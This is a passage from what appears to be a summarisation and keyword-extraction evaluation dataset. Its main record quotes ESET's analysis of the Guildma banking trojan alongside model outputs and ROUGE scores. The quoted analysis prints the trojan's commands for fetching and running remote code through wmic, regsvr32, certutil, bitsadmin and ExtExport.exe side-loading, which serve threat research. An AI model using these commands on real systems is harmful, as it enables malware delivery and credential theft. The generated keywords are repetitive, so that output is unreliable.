stolen credentials collected by SLAPSTICK and tools like Mimikatz. They moved laterally through networks via RDP and SSH. Virtual machines with hacking tools were deployed to avoid detection. Anti-forensics tools like LOGBLEACH were used to manipulate timestamps and delete logs. The custom malware STEELCORGI used environment variables as decryption keys. While internal reconnaissance was conducted with tools like Luckscan/BlueKeep, no data exfiltration was observed. ROLLCOAST ransomware was deployed in some cases. UNC1945 demonstrated technical sophistication, utilizing exploits, custom malware, virtual machines, and advanced lateral movement techniques. Their motivations appear to be gaining and selling access rather than conducting cyber espionage or data theft. <END-1>", "t5/keyword/hint_hit_precision": 0.22727272727272727, "t5/word/hint_hit_recall": 0.09497206703910614, "gpt3/lexical/rouge_rouge1": 0.4970760233918129, "gpt3/lexical/rouge_rouge2": 0.12941176470588234, "gpt3/lexical/rouge_rougeL": 0.2456140350877193, "gpt3/lexical/rouge_rougeLsum": 0.2456140350877193, "gpt3_generated_text": ["The article discusses the activities of UNC1945, a threat actor group that targeted managed service providers and entities in the financial and professional consulting industries by gaining access to third-party networks. In late 2018, UNC1945 compromised a Solaris server and installed a backdoor known as SLAPSTICK to capture credentials for further compromise. They utilized various tools and techniques to evade detection and operated from custom virtual machines. In late 2020, UNC1945 deployed a zero-day exploit (CVE-2020-14871) on a Solaris 9 server, demonstrating advanced technical capabilities. The threat actor established a foothold and maintained persistence on compromised systems using SLAPSTICK and a custom backdoor named LEMONSTICK. Mandiant discovered and reported CVE-2020-14871 to Oracle, emphasizing the importance of staying current on patch updates for enhanced security. The UNC1945 attack lifecycle highlights the sophisticated tactics and tools employed by threat actors to access and exploit systems, underscoring the need for robust cybersecurity defenses in businesses and organizations."]}, {"split_name": "val", "sample_id": "val_134", "prompt_text": "Extract the keywords: 3/14/2020Guildma: The Devil drives electric | WeLiveSecurityGuildma: The Devil drives electric welivesecurity.com/2020/03/05/guildma-devil-drives-electricMarch 5, 2020In this blogpost, we will examine Guildma (also known as Astaroth, a powerful demon), a highly prevalent Latin American banking trojan. This Brazil-targeting trojan, written in Delphi, boasts some innovative execution and attack techniques. We will describe the most recent version, highlighting the most notable changes made since the middle of 2019 when an avalanche of articles about Guildma was published in response to its largest campaign to date. Characteristics Guildma is a Latin American banking trojan that targets Brazil exclusively. Based on our telemetry \u2014 as well as the public attention it has received \u2014 we believe it to be the most impactful and advanced banking trojan in the region. Besides targeting \ufb01nancial institutions, Guildma also attempts to steal credentials for email accounts, e\u2011shops and streaming services, and affects at least ten times as many victims as other Latin American banking trojans already described in this series. It uses innovative methods of execution and sophisticated attack techniques.Unlike the Latin American banking trojans we have described previously, Guildma does not store the fake pop-up windows it uses within the binary. Instead, the attack is orchestrated by its C&C server. This gives the authors greater \ufb02exibility to react to countermeasures implemented by the targeted banks.Guildma implements the following backdoor functionalities:Taking screenshots Capturing keystrokes Emulating keyboard and mouse Blocking shortcuts (such as disabling Alt + F4 to make it harder to get rid of fake windows it may display) Downloading and executing \ufb01les Restarting the machineGuildma is very modular. At the time of writing, it consists of 10 modules, not including distribution chain stages. The functionality of individual modules will be discussed later. Evolution of distribution chains Our telemetry indicates Guildma spreads exclusively through spam emails with malicious attachments. Here are a few examples from a campaign from the middle of November 2019.url The Devil drives electric | WeLiveSecurityFigure 1. Spam email example (translation: \u201cHello, please explain these photos to me. I\u2019m waiting for yourexplanation!\u201d)Figure 2. Spam email example (translation: \u201cDear member of cons\u00f3rcio, attached is the proof of bid no.75432.\u201d)url The Devil drives electric | WeLiveSecurityFigure 3. Spam email example (translation: \u201cGood morning, I am sending the proof of transfer \u2013 DOC.Citibank\u201d)Figure 4. Spam email example. Fake invoice reminder stating that a payment is due the day after tomorrow andthat the payment may take up to 72 hours to be processed.One of the de\ufb01ning characteristics of Guildma\u2019s distribution chains is using tools already present on the system, often in new and unusual ways.url The Devil drives electric | WeLiveSecurityAnother characteristic is reusing techniques. New techniques are added every once in a while, but for the most part, the developers seem to simply reuse techniques from older versions.Figure 5. Distribution chain of Guildma in version 150Figure 5 shows the distribution chain for version 150, but the structure of Guildma\u2019s distribution chains is very dynamic. For instance, in previous versions, the malicious LNK \ufb01le shown in Figure 5 was not embedded in a ZIP archive, or an SFX RAR archive containing an MSI installer was used instead. Also, there used to be another JScript stage whose sole purpose was downloading and executing the \ufb01nal JScript stage; there have been too many changes overall to \ufb01t into this article. In fact, the only part that has mostly stayed the same is the \ufb01nal JScript stage.Using data from our long-term, in-depth tracking of this family, we have compiled a very good picture of Guildma\u2019s activity.Figure 6 shows all ESET detections of Guildma\u2019s \ufb01rst-stage component. As you can see, the campaigns were ramping up slowly until a massive campaign in August 2019, when we were seeing up to 50,000 samples per day. This campaign went on for almost two months and accounted for more than double the amount of detections we had seen in the 10 months prior.Figure 6. First stage Guildma detections since October 2018Following is a summary of some of the more interesting techniques used in the last 14 months. Execution of the JScript stageurl The Devil drives electric | WeLiveSecurityOver the last year, Guildma has used several methods of executing the JScript stages of its distribution chain. At the end of 2018, Guildma was hiding its code in eXtensible Stylesheet Language (.xsl) \ufb01les and using wmic.exe to download and execute them:wmic.exe <wmic query> /format:\u201d<URL>\u201dIt then brie\ufb02y moved on to using regsvr32.exe and scrobj.dll to download a JScript-implemented COM object and execute its registration routine (which contained the malicious code):regsvr32.exe /s /n /u /i:<URL> scrobj.dllMost recently, the authors started abusing Windows Explorer to execute the JScript stage. This attack relies on the fact that Windows Explorer will try to open any \ufb01le passed to it on the command line with its associated program and the fact that the default association for .js \ufb01les is the Microsoft Windows Script Host. The \u201cscript\u201d passed to Windows Explorer is a single command whose purpose is to download and execute the actual JScript stage:echo GetObject(\u2018script:<URL>\u2019) > <\ufb01le>.js | explorer.exe <random switches> <\ufb01le>.js Execution of the binary modules Methods of running the PE modules are no less diverse.When we started tracking Guildma, it was abusing Avast\u2019s aswRunDll.exe to launch the \ufb01rst binary stage, with regsvr32.exe as a failover for computers where Avast\u2019s products weren\u2019t installed. The use of aswRunDll.exe was then dropped, leaving regsvr32.exe as the sole method of execution. After a brief period of using rundll32.exe, Guildma switched to its current execution method \u2014 ExtExport.exe.ExtExport.exe is an undocumented component of Microsoft Internet Explorer used for exporting bookmarks from Mozilla Firefox and 360 Secure Browser, and can be abused for DLL Side- Loading. When the following command is executed, mozcrt19.dll, mozsqlite3.dll, and sqlite3.dll are loaded from the folder speci\ufb01ed on the command line:C:\\Program Files\\Internet Explorer\\ExtExport.exe <folder> <dummy 1> <dummy 2>To abuse this, you would normally drop the DLL to be loaded as one of the above-mentioned \ufb01les; Guildma uses all three. Downloading the binary modules Guildma has also utilized a couple of different ways to download the binary modules. The \ufb01rst version was using certutil.exe copied to certis.exe (presumably to evade detection):certis.exe -urlcache -split -f \u201c<URL>\u201d \u201c<destination path>\u201dThe authors then switched to BITSAdmin \u2014 the Microsoft Background Intelligent Transfer Service management tool \u2014 and are still using it at the time of writing:bitsadmin.exe /transfer <random number> /priority foreground <URL> <destination>url The Devil drives electric | WeLiveSecurityFor a couple months, the binary modules were base64-encoded and hosted on Google Cloud. In that time, Guildma was using both BITSAdmin and certutil \u2014 BITSAdmin to download the modules and certutil to decode them. Other changes Guildma uses strange, non-descriptive variable and function names. When we started tracking Guildma, the names, while nonsensical, were clearly man-made (e.g. \u201cradador\u201d for the random number function or \u201cBxaki\u201d for the download function). In June 2019 they were all changed to random-looking names (e.g. \u201cbx021\u201d and \u201cmrc430\u201d). At \ufb01rst, we thought the authors implemented some kind of an automated script obfuscator, but it turned out to be a onetime change and the names have remained the same since.A relatively new addition is the age-old technique of using ADS (Alternate Data Streams) to store the binary modules. All the modules are now stored as ADS of a single \ufb01le (e.g. \u201cdesktop.ini:nauwuygiaa.jpg\u201d, \u201cdesktop.ini:nauwuygiab.jpg\u201d, etc.). Version history Guildma has seemingly gone through many versions during its development, but there was usually very little development between versions \u2014 due to its clunky architecture utilizing hardcoded con\ufb01guration values, for the most part the authors have to recompile all the binaries for every new campaign. A job that is clearly not completely automated, since there has often been a signi\ufb01cant delay between updating the version number in the scripts and in the binaries.In this article, we cover version 150, but since we started writing, two more versions have been released. They contain no substantial change in functionality or distribution, supporting our claims about Guildma\u2019s development cycle.The \ufb01nal stage of the distribution chain used to contain a version name (and even before that, it used to download said name along with the binary modules), but it has been (presumably) permanently replaced with a simple \u201cxXx\u201d since version 148.Table 1 summarizes all the versions released since we started tracking Guildma actively in October 2018. Looking at the version strings, we get the feeling the author is passionate about ecology and fast cars.Table 1. Guildma version historyVersion number Version nameFirst seen 2018-09-18 131 2018-10-31 132 2018-11-28 133 2018-11-29 134Version pre\ufb01x 134_MAXX_TESLAsdwqiopawsamazonurl The Devil drives electric | WeLiveSecurityVersion number Version nameFirst seen 2018-12-03 135 2018-12-13 136 2019-02-06 137 2019-03-21 138 2019-05-20 139 2019-06-03 140 2019-06-24 141 2019-07-17 142 2019-08-09 143 2019-08-26 144 2019-09-26 145 2019-10-16 146 2019-11-04 147 2019-11-19 148 2019-11-22 149 2019-12-13 150 2020-01-14 151 2020-02-05 152Version pre\ufb01x As mentioned earlier, Guildma is very modular; the structure of its modules seems to be mostly constant. In this section, we will brie\ufb02y describe the functionality of each module.All module names are composed of a shared, version-dependent pre\ufb01x and a module-speci\ufb01c suf\ufb01x. In Table 2, the version-dependent pre\ufb01x is andrealfo.Table 2. Guildma module overviewURL \ufb01lename andrealfohh1a.dll.zip andrealfo64.~Filesystem \ufb01lenameModule Main module loader 1 (part 1)url The Devil drives electric | WeLiveSecurityURL \ufb01lename andrealfohh1b.dll.zip andrealfoxa.gif.zip andrealfoxb.gif.zip andrealfoxc.gif.zip andrealfogx.gif.zip andrealfog.gif.zip andrealfoc.jpg.zipFilesystem wwn.gif.zip andrealfodx.gif.zip andrealfoa.jpg.zip andrealfob.jpg.zip andrealfoi.gif.zipandrealfodwwn.gifandrealfodx.gif Main module loader 1 (part 2) Main module injector (part 1) Main module injector (part 2) Main module injector (part 3) Main module loader 2 Main module Contacts stealer and form grabber module RAT module (DLL)RAT module (EXE) JScript dropper moduleWith the exception of the main module loader 1 (*64.~) and the main module injector (*xa.gif, *xb.gif and *xc.gif), all the modules are encrypted with a simple XOR cipher using a repeating 32- byte key. The key is generated from a 32-bit seed using the algorithm shown in Figure 7. The seed value is obfuscated in the binaries to prevent simple extraction (see Figure 8).1 for i in range ( 32 ): key . append ( seed & 0xff ); seed >>= 1;Figure 7. Key generation algorithmurl The Devil drives electric | WeLiveSecurityFigure 8. Seed obfuscation in the binaryThree modules communicate with a C&C server: Main module, RAT module, and Contacts stealer and form grabber. The communication is done over HTTP(S) using a combination of base64 and various simple custom encryption algorithms to protect the data being transferred.In the next section, we describe how the C&C server address is obtained. Main module loader 1 (*64.~) This is the \ufb01rst binary stage of the chain. The \ufb01le is a DLL downloaded in two parts, which are concatenated by the previous JScript stage. It loads the three \ufb01les comprising the next stage loader (*xa.gif, *xb.gif and *xc.gif), concatenates them, maps the resulting PE \ufb01le into its own address space and executes it.Loading a PE \ufb01le is a relatively complex process, so the authors used the BTMemoryModule open-source library for this purpose. Main module injector (*xa.gif + *xb.gif + *xc.gif) This module loads the next stage (*gx.gif) from disk and decrypts it. It then runs the \ufb01rst existing executable from the following list and injects the decrypted payload into it.C:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exe C:\\Program Files\\Diebold\\Warsaw\\unins000.exe * C:\\Windows\\SysWOW64\\userinit.exe C:\\Windows\\System32\\userinit.exeAn application, popular in Brazil, to protect access to online banking. * Main module loader 2 (*gx.gif) The last loader stage is very simple and seems to needlessly duplicate the functionality of main module loader 1. It loads and decrypts the main module (*g.gif), maps it into its own memory space and executes it. Main module (*g.gif)url The Devil drives electric | WeLiveSecurityGuildma\u2019s main module orchestrates all the remaining modules. Its implementation is deceptively complex, using countless timers and events, but its functionality is actually relatively simple. It contains legacy code that is not being used anymore as well as pre-production code that is not being used yet.On loading, this module checks if it is running in a sandboxed environment (for example, by examining the computer name and system disk volume ID), if there are other running instances of itself (based on window names) and if the system locale is different from Portuguese. If any check reveals the system is uninteresting or already compromised by Guildma, the malware terminates.Otherwise, the module then collects information from the system (computer name, which security software is being used, installed programs\u2026) and establishes contact with the C&C server. It then starts monitoring interesting events, mainly when certain applications are launched or online banking sites opened, and executing appropriate actions (e.g. taking screenshots, preventing the user from closing the window by intercepting keyboard shortcuts, launching the RAT module, and so on).The module also implements backdoor commands whose functionality largely overlaps with the RAT module. Contact stealer and form grabber (*c.jpg) This module has two functions \u2014 gathering email addresses and form data from webpages.Email addresses are obtained from desktop email clients (such as Microsoft Outlook, Thunderbird and The Bat!) by parsing their address books as well as the emails themselves.The form grabber uses Windows COM technology to interact with Internet Explorer. It waits until a targeted site is opened (mostly Brazilian webmails, e-shops and payment gateways) and then logs the user out, forcing the victim to input credentials. It then retrieves the DOM and looks for important input \ufb01eld values (such as usernames, passwords and credit card numbers). RAT module (*dwwn.gif, *dx.gif) The RAT module comes in two functionally identical compilations \u2014 DLL (*dwwn.gif) and EXE (*.dx.gif).It implements download and execute functionality, can take screenshots, emulate keyboard and mouse input, and restart the computer.Most Latin American banking trojans display fake pop-up windows based on monitoring the active window\u2019s name. These windows are usually stored in the binary. We have not found such code in Guildma, but the RAT module contains a Delphi form implementing a simple web browser. Since it is also executed based on the active window\u2019s name, we believe this form is used for displaying fake dialogs to the user. MailPassView (*a.jpg) and BrowserPassView (*b.jpg)url The Devil drives electric | WeLiveSecurityThese are freeware tools from Nirsoft for extracting saved credentials from popular email clients and web browsers respectively. Since Nirsoft has removed support for quiet operation (output to \ufb01le, with no GUI) from newer versions to curb the abuse of these tools by malware, Guildma\u2019s authors are using older versions that had those features. The same tools are also leveraged by Mispadu, except Mispadu is using newer versions with quiet operation support patched back in. JScript dropper module (*i.gif) This module drops and executes (using cscript.exe) a JScript \ufb01le. The script consists of two parts \u2014 the \ufb01rst part is stored as one long encrypted string, while the second part is assembled from many short strings (some encrypted and some in plaintext). Worthy of note is the fact that strings in the dropped JScript \ufb01le are encrypted by this dropper module with a randomly generated key, so they are present in the clear in the dropper.The script executes the following actions:Disables UAC Disables EXE signature checking Disables Windows Defender Creates a \ufb01rewall rule disabling network access for C:\\Program Files\\AVAST Software\\Avast\\Setup\\avast.setup Disables wsddntf driver (Diebold Warsaw GAS Tecnologia \u2014 the banking access protection software introduced earlier) Adds a \ufb01rewall exception for \ufb01les used as injection targetsC:\\Program Files\\Diebold\\Warsaw\\unins000.exe C:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exeWe believe this module may still be in development as we have never observed it on our test machines dropping the script. New developments (since mid-2019)New C&C retrieval In version 142, a new way of distributing C&C servers, abusing YouTube and Facebook pro\ufb01les, was implemented. However, the authors stopped using Facebook almost immediately and, at the time of writing, are fully relying on YouTube. This is similar to Casbaneiro, but a bit cruder. While Casbaneiro was hiding the data in video descriptions and obfuscating it as a part of a URL, Guildma simply places the data in the channel description. The start and end of the encrypted C&C addresses is delimited by \u201c|||\u201d. The data in between is base64 encoded and encrypted using Mispadu\u2019s string encryption algorithm. This is now the primary method of retrieving C&C servers; the old method (described by Avast) is still present as a backup.url The Devil drives electric | WeLiveSecurityFigure 9. Encrypted Guildma C&C server domains stored on YouTubeModules added and removed The previously described JScript dropper module was added in version 145. Conversely, in version 139, Guildma dropped two other modules present in older versions \u2014 mass mailer (*f.jpg) and its loader (*e.jpg). In the next few versions, these modules were still accessible under the expected names (<version pre\ufb01x>e.jpg and <version pre\ufb01x>f.jpg) from the same server as the other modules. This leads us to believe these modules are still being developed, but are now only distributed as needed, presumably using the download and execute backdoor command. New string encryption The JScript dropper module brought with it a new string encryption algorithm. A variant of this algorithm (shown in Figure 10) was propagated into other modules in version 147.url The Devil drives electric | WeLiveSecuritydef decrypt ( ct, key ): # stage 1 ct = unhexlify ( ct ); last = ct [ 0 ]; s = bytearray ( ct [ 1 : ] ); for i in range ( len ( s ) ): x = s [ i ] ^ key [ i % len ( key ) ]; if last > x: last = s [ i ]; s [ i ] = x; # stage 2 - reverse string s = s [::-1]; # stage 3 - c = not ( c - 10 ) s = \"\" . join ( [ chr ( ( ~( c - 10 ) ) & 0xff ) for c in s ] ); # stage 4 - Base25 decode and key subtraction k = ord ( s [ 0 ] ) - 65; ot = \"\"; for i in range ( 1, len ( s ), 2 ): ot += chr ( ( ord ( s [ i ] ) - 65 ) * 25 + ord ( s [ i + 1 ] ) - 65 - k - 100 ); return ot;1 26Figure 10. New string encryption algorithmurl The Devil drives electric | WeLiveSecurityOriginally, Guildma was using the same string encryption as Casbaneiro. The new algorithm has four stages and as you can see, the original string encryption algorithm is still used as the \ufb01rst stage. Also of note is the fact that the fourth stage is once again using Mispadu\u2019s encryption algorithm.In version 148 Guildma implemented a string table; all strings are decrypted at the beginning of execution and accessed from the table when needed. Removal of international targets In version 138, Guildma added capability to target institutions (mainly banks) outside of Brazil. Despite that, we have observed no international campaigns; the campaigns hosting \ufb01les on Cloud\ufb02are Workers\u2019 infrastructure even went as far as to block any downloads from non-Brazilian IPs. In fact, in the last 14 months we haven\u2019t seen any campaign targeting users outside of Brazil.Finally, in version 145, the capability to target institutions outside of Brazil was removed. Based on these facts, we believe it was merely an in-development feature which ended up being In this part of the series, we have talked about Guildma, the most prevalent Latin American banking trojan we have seen. We have shown its rich historical developments while focusing on the most recent variant.Guildma once again shares the prevailing characteristics of a Latin American banking trojan. It is written in Delphi, targets the region, implements backdoor functionality, splits its functionality into many modules and abuses legitimate tools.Guildma also shares interesting common features with families described earlier in this series. Namely, its current encryption algorithm combines the ones used by Casbaneiro and Mispadu.For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise can also be found in our GitHub repository. Indicators of Compromise (IoCs)HashesSHA-1 Main module loader 1injectorESET Detection name Win32/Spy.Guild\u2010 ma.BM Win32/Spy.Guild\u2010 ma.BJurl The Devil drives electric | WeLiveSecuritySHA-1 er and form Win32/Spy.Guild\u2010 ma.Q Win32/Spy.Guild\u2010 ma.BS Win32/Spy.Guild\u2010 C:\\Users\\Public\\Libraries\\qlanl\\* Startup link LocationWin32/Spy.Guild\u2010 ma.BR Win32/Spy.Guild\u2010 ma.BR(DLL) MailPassView Win32/PSWTool.\u2010 MailPassView.E Win32/PSWTool.W Win32/Spy.Guild\u2010 module%APPDATA%\\Microsoft\\Programs\\StartUp\\reiast%USERNAME%%COMPUTERNAME%.lnkTargetsC:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe C:\\Program Files\\Internet Explorer\\ExtExport.exeArgs<install dir> <rand> <rand> (where <rand> is a random, 5 to 9 character long string generated from the alphabet qwertyuiop1lgfdsas2dfghj3zcvbnmm) C&C serversurl The Devil drives electric | WeLiveSecurityurl url url url url url url url url url url url url ATT&CK techniquesNameTactic ID tionT1060 Registry Run T1197 BITS Jobs T1089 Disabling Se\u2010curity ToolsT1140 Deobfuscate/ T1073 DLL Side-LoadingT1096 NTFS File AttributesDescription Guildma distribution chains start with a malicious email attachment.Guildma utilizes rundll32.exe to execute its binary modules. Guildma abuses WMIC.exe to execute some of its distribution chain stages.Guildma ensures persistence by creating a LNK \ufb01le in the %STARTUP% folder.BITSAdmin.exe is used to download binary modules. Guildma disables Windows Defender.The majority of Guildma modules need to be decrypt\u2010 ed after downloading.Guildma abuses ExtExport.exe for DLL Side-Loading.Guildma utilizes ADS to hide its modules on disk.url The Devil drives electric | WeLiveSecurityTactic IDNameT1055 Process Injection T1064 ScriptingT1220 XSL Script ProcessingT1081 Credentials inFilesT1214 Credentials inRegistryT1083 File and Di\u2010 DiscoveryT1063 Security Soft\u2010ware DiscoveryT1082 System Infor\u2010mation DiscoveryT1497 Virtualization/Sandbox ic ProtocolT1041 Ex\ufb01ltration Guildma utilizes process injection when executing its modules. Guildma implements its distribution chain stages in various scripting languages (mainly JScript). Guildma utilizes XSL script(s) in its distribution chains. Guildma extracts credentials stored by web browsers and email clients in \ufb01les. Guildma extracts credentials stored by web browsers and email clients in Windows Registry. Guildma uses presence of certain \ufb01les to determine whether banking and security tools are installed.Guildma uses window discovery to \ufb01nd and terminate older versions of itself and to detect when interesting programs (e.g. banking applications or web browsers) are running. Guildma detects the presence of several security products.Guildma collects OS version and bitness, computer name and system locale.Guildma uses directory names, computer names, vol\u2010 ume IDs, and existence of named objects to detect sandboxes and virtualized environments. Guildma is capable of taking screenshots.New C&C addresses are encrypted using custom en\u2010 cryption algorithms.Guildma uploads screenshots and log \ufb01les to the C&C server.url The Devil drives electric | WeLiveSecurityESET Research 5 Mar 2020 - 11:30AMurl ", "generated_text": "the document; a banking trojan; Astaroth; Brazil; its campaign; 2019; the attackers; techniques; screenshots; keystrokes; keystrokes; keystrokes; the backdoor; tools; older versions; reusing techniques; new features; the first stage; the JScript stage; new variants; the system; the final JScript stage; the most recent version; similarities; the Latin American banking trojans.", "ref_text": "<START-1>The PDF describes Guildma, a prevalent Brazilian banking trojan written in Delphi. Guildma spreads through spam emails containing malicious attachments and has modular architecture consisting of 10 modules. It implements backdoor functionality like screenshotting, keylogging, and downloading additional payloads. Guildma retrieves C&C servers from YouTube channel descriptions encrypted using custom algorithms. It uses innovative techniques for execution and attack, like abusing Windows Explorer, BITSAdmin, and ExtExport. The PDF analyzes the evolution of Guildma's distribution chains, which reuse old techniques and leverage tools already on the system like WMIC, RegSvr32, and CertUtil. The modules are XOR encrypted and some contain stolen credential extraction tools. Recent developments include new string encryption algorithms combining those of other trojans, and social media C&C retrieval. Guildma is constantly updated but has redundant legacy code. It solely targets Brazil and checks for sandbox environments. In summary, Guildma is an advanced, prevalent banking trojan active in Brazil that uses unique techniques for distribution, execution, command and control, and credential theft. It is under active development and continues to evolve its tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.16, "t5/word/hint_hit_recall": 0.028735632183908046, "gpt3/lexical/rouge_rouge1": 0.484472049689441, "gpt3/lexical/rouge_rouge2": 0.16874999999999998, "gpt3/lexical/rouge_rougeL": 0.22981366459627325, "gpt3/lexical/rouge_rougeLsum": 0.22981366459627325, "gpt3_generated_text": ["Guildma, also known as Astaroth, is a powerful Latin American banking trojan that exclusively targets Brazil. The trojan, written in Delphi, is highly prevalent and sophisticated, with innovative execution and attack techniques. It steals credentials for various accounts, including financial institutions, email accounts, e-shops, and streaming services. Guildma is modular, with 10 modules at the time of writing, and implements backdoor functionalities such as taking screenshots, capturing keystrokes, and blocking shortcuts. The trojan spreads through spam emails with malicious attachments and uses tools already present on the system in new and unusual ways. The distribution chains of Guildma evolve, with the attackers reusing techniques from older versions while adding new features. The article provides insights into the evolution of Guildma\u2019s distribution chains, the similarities and differences between the trojan and other Latin American banking trojans, and the impact of its campaigns in 2019."]}]